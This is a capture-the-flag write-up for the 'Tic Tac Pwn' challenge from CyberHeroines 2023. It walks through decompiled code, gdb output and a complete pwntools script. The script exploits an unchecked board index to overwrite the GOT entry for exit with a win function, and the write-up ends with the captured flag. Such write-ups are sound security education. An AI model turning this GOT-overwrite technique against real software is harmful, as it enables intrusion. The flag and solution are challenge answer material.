# CyberHeroines 2023

## Carol Shaw

> [Carol Shaw](https://en.wikipedia.org/wiki/Carol_Shaw) (born 1955) is one of the first female game designers and programmers in the video game industry.She is best known for creating the Atari 2600 vertically scrolling shooter River Raid (1982) for Activision. She worked for Atari, Inc. from 1978 to 1980 where she designed multiple games including 3-D Tic-Tac-Toe (1978) and Video Checkers (1980), both for the Atari VCS before it was renamed to the 2600. She left game development in 1984 and retired in 1990. - [Wikipedia Entry](https://en.wikipedia.org/wiki/Carol_Shaw)
> 
> Chal: Play Tic Tac Pwn at `0.cloud.chals.io:27824` and return the flag to [this video game pioneer](https://www.youtube.com/watch?v=GtIIaTeMspU)
>
>  Author: [TJ](https://www.tjoconnor.org/)
>
> [`tic-tac-toe.bin`](tic-tac-toe.bin)

Tags: _pwn_

## Solution
For this challenge we get a binary to exploit. First we check what security measurements are in place so we can decide how our approach will look like.

```bash
$ checksec ./tic-tac-toe.bin
[*] '/home/ctf/carol/tic-tac-toe.bin'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So, no canary was found, this means we can potentially overflow buffers and override `ret` addresses. Executing shellcode from stack buffers will not work, as NX is enabled. But Position Independent Code (PIE) is disabled, this is nice since we can just hardcode addresses as they will stay at the same place every run. Lets fire up Ghidra to see whats going on. We obviously have a implementation of [`Tic-tac-toe`](https://en.wikipedia.org/wiki/Tic-tac-toe). 

After cleaning up the code we see the following happens. First the board is initialized with space characters. Then `player 1` is requested to enter the symbol he wants to play with. If the symbol is `X` the other player plays `O`, otherwise player 2 plays `X`. The interesting fact here is, that `player 1` can choose it's symbol freely. There is no check if its X or Y, so player 1 can choose any byte value he likes.

```c
  currentPlayer = 1;
  symbolPlayer1 = 0x4f58;
  puts("------------------------------");
  printf("Tic Tac Pwn v%li              \n",rand);
  puts("------------------------------");
  do {
    for (i = 0; i < 3; i = i + 1) {
      for (j = 0; j < 3; j = j + 1) {
        board[(long)i * 3 + (long)j] = ' ';
      }
    }
    printf("Player 1: Choose your symbol (\'X\' or \'O\') >>> ");
    __isoc99_scanf(&DAT_004020af,&symbolPlayer1);
    if ((char)symbolPlayer1 == 'X') {
      symbolPlayer2 = 'O';
    }
    else {
      symbolPlayer2 = 'X';
    }
    symbolPlayer1 = symbolPlayer1 & 0xff | (ushort)symbolPlayer2 << 8;
```

After this the main loop starts. The current board state is displayed and the player, who will do the current move, is requested to enter `row` and `column`. Here's another interesting thing. For neighter row nor column is a range check in place. So players can freely override own fields, override fields the other player already set is symbol or write completely out of bounds of the board. Since `player 1` can choose the symbol freely this is in fact a `write-what-where` condition.

After this the game checks for `win` or `draw` condition and sets the next player as current player if the game moves on. If the game was over the user is asked if he wants to play another game, if not the game just calls `exit` rather than exiting the loops and returning out of `main`.

```c
    while( true ) {
      displayBoard();
      printf("Player %d, enter row (0-2) and column (0-2) to place your symbol >>> ",
             (ulong)currentPlayer);
      __isoc99_scanf("%d %d",&row,&column);
      board[(long)row * 3 + (long)column] =
           *(undefined *)((long)&symbolPlayer1 + (long)(int)(currentPlayer - 1));
      result = checkWin(board);
      if (result != '\0') break;
      result = checkDraw(board);
      if (result != '\0') {
        displayBoard();
        puts("<<< It\'s a draw!");
        goto LAB_00401678;
      }
      if (currentPlayer == 1) {
        currentPlayer = 2;
      }
      else {
        currentPlayer = 1;
      }
    }
    displayBoard();
    printf("<<< Player %d wins!\n",(ulong)currentPlayer);
LAB_00401678:
    printf("Do you want to play again? (Y/N) >>> ");
    __isoc99_scanf(&DAT_004020af,&local_1f);
    if ((local_1f != 'Y') && (local_1f != 'y')) {
      puts("Goodbye!\n");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
  } while( true );
```

All the other functions are not too unteresting to exploit this. But we have everything in place. We can write with player 1 whatever we like into memory. The only question is, what should we write and where should we write it to? If we inspect a bit futher we see that there is a `win` function, which is never called.

```c
void win(void)
{
  undefined local_118 [264];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  __isoc99_fscanf(local_10,&DAT_00402013,local_118);
  printf("<<< Congratulations: %s\n",local_118);
  return;
}
```

So we need to somehow call this function. Since the game calls exit, after the player chooses not to play anymore, the plan is to reroute the `exit` call to `win`. This can be done by overriding the [`GOT`](https://en.wikipedia.org/wiki/Global_Offset_Table) entry for `exit` with the address of `win`. Since our writes are going through the `board` array we need to find the offset of the `GOT` entry relative to `board`. This can be done by fireing up `gdb`.

```bash
$ gdb ./tic-tac-toe.bin
pwndbg> break main
Breakpoint 1 at 0x401493
pwndbg> r
Starting program: /home/ctf/carol/tic-tac-toe.bin
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0000000000401493 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────
 RAX  0x40148f (main) ◂— push   rbp
 RBX  0x7fffffffdf38 —▸ 0x7fffffffe195 ◂— '/home/ctf/carol/tic-tac-toe.bin'
 RCX  0x403df8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401160 (__do_global_dtors_aux) ◂— endbr64
 RDX  0x7fffffffdf48 —▸ 0x7fffffffe1cb ◂— 'SHELL=/bin/bash'
 RDI  0x1
 RSI  0x7fffffffdf38 —▸ 0x7fffffffe195 ◂— '/home/ctf/carol/tic-tac-toe.bin'
 R8   0x0
 R9   0x7ffff7fcf6a0 (_dl_fini) ◂— push   rbp
 R10  0x7ffff7fcb878 ◂— 0xc00120000000e
 R11  0x7ffff7fe18c0 (_dl_audit_preinit) ◂— mov    eax, dword ptr [rip + 0x1b552]
 R12  0x0
 R13  0x7fffffffdf48 —▸ 0x7fffffffe1cb ◂— 'SHELL=/bin/bash'
 R14  0x403df8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401160 (__do_global_dtors_aux) ◂— endbr64
 R15  0x7ffff7ffd020 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0
 RBP  0x7fffffffde20 ◂— 0x1
 RSP  0x7fffffffde20 ◂— 0x1
 RIP  0x401493 (main+4) ◂— sub    rsp, 0x20
───────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────
 ► 0x401493 <main+4>     sub    rsp, 0x20
   0x401497 <main+8>     mov    dword ptr [rbp - 4], 1
   0x40149e <main+15>    mov    word ptr [rbp - 0x16], 0x4f58
   0x4014a4 <main+21>    lea    rax, [rip + 0xb95]
   0x4014ab <main+28>    mov    rdi, rax
   0x4014ae <main+31>    call   puts@plt                      <puts@plt>

   0x4014b3 <main+36>    mov    rax, qword ptr [rip + 0x2b26]
   0x4014ba <main+43>    mov    rsi, rax
   0x4014bd <main+46>    lea    rax, [rip + 0xb9c]
   0x4014c4 <main+53>    mov    rdi, rax
   0x4014c7 <main+56>    mov    eax, 0
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rbp rsp 0x7fffffffde20 ◂— 0x1
01:0008│         0x7fffffffde28 —▸ 0x7ffff7def18a (__libc_start_call_main+122) ◂— mov    edi, eax
02:0010│         0x7fffffffde30 ◂— 0x0
03:0018│         0x7fffffffde38 —▸ 0x40148f (main) ◂— push   rbp
04:0020│         0x7fffffffde40 ◂— 0x100000000
05:0028│         0x7fffffffde48 —▸ 0x7fffffffdf38 —▸ 0x7fffffffe195 ◂— '/home/ctf/carol/tic-tac-toe.bin'
06:0030│         0x7fffffffde50 —▸ 0x7fffffffdf38 —▸ 0x7fffffffe195 ◂— '/home/ctf/carol/tic-tac-toe.bin'
07:0038│         0x7fffffffde58 ◂— 0x49e13301bdad6b8a
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► f 0         0x401493 main+4
   f 1   0x7ffff7def18a __libc_start_call_main+122
   f 2   0x7ffff7def245 __libc_start_main+133
   f 3         0x4010d1 _start+33
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
```

Now we are at a breakpoint in main, we can query values.

```bash
pwndbg> p &'exit@got.plt'
$2 = (<text from jump slot in .got.plt, no debug info> *) 0x404038 <exit@got[plt]>
pwndbg> p &board
$3 = (<data variable, no debug info> *) 0x404090 <board>
pwndbg> p &win
$4 = (<text variable, no debug info> *) 0x4011d9 <win>
```

Perfect, the offset from `board` to `exit@got[plt]` is `0x404038 - 0x404090 = -88 bytes`, and the `win` function is at address `0x4011d9`. What we want to do is to write the address to memory like this:

```c
board[-88] = 0xd9
board[-87] = 0x11
board[-86] = 0x40
```

If we do this, every call to `exit` will end up in `win`, since the function address was replaced. Now we have to find a way how we can play the game so that the address is overriden with the correct values. Since we only can change the symbol at the beginning of a game we have to play three games. The only thing we need to keep in mind is the current player for the next round. Since the player index is not reset before the game starts, it can be either player 1 or player 2 depending who did the last move. This needs to be considered when playing.

```bash
- Player 1 chooses symbol 0xd9
- Play game and let player 2 win, player 1 will write only to buffer[-88]
- Play another game 'Y'

- Player 1 chooses symbol 0x11
- Play game and let player 2 win, player 1 will write only to buffer[-87]
- Play another game 'Y'

- Player 1 chooses symbol 0x40
- Play game and let player 2 win, player 1 will write only to buffer[-86]
- Play another game 'N'
```

Thats about it. Nothing more! Lets see if it works, by writing a small python script.

```python
from pwn import *

p = remote("0.cloud.chals.io", 27824)
binary = ELF("./tic-tac-toe.bin", checksec=False)

def write_address_byte_at(b, pos, game):
    p.sendlineafter(b">>>", b)

    # after playing one game the 'next' player is player 2, meaning player 2 
    # will be the first player in every round except the first one. since only 
    # player 1 can freely choose it's symbol (and therefore override the got entry) 
    # we do one move for player 2 and then play the round as normal
    if game > 0:
        p.sendlineafter(b">>>", b"0 0")

    for i in range(3):
        p.sendlineafter(b">>>", b"0 %i" %pos)
        p.sendlineafter(b">>>", b"0 %i" %i)

offset = binary.got["exit"] - binary.sym["board"]
win_addr = binary.sym["win"]
i = 0

while win_addr != 0:
    address_byte = (win_addr&0xff).to_bytes(1, 'big')
    win_addr >>= 8
    write_address_byte_at(address_byte, offset+i, i)
    
    p.sendlineafter(b">>>", b"Y" if win_addr != 0 else b"N")
    i += 1

p.interactive()
```

Running the script gives us the flag.

```bash
$ python solve_carol.py
[+] Opening connection to 0.cloud.chals.io on port 27824: Done
[*] Switching to interactive mode
 Goodbye!

<<< Congratulations: chctf{1_p3rs0n_woulD_do_t43_3nt1re_GAM3}
```

Flag `chctf{1_p3rs0n_woulD_do_t43_3nt1re_GAM3}`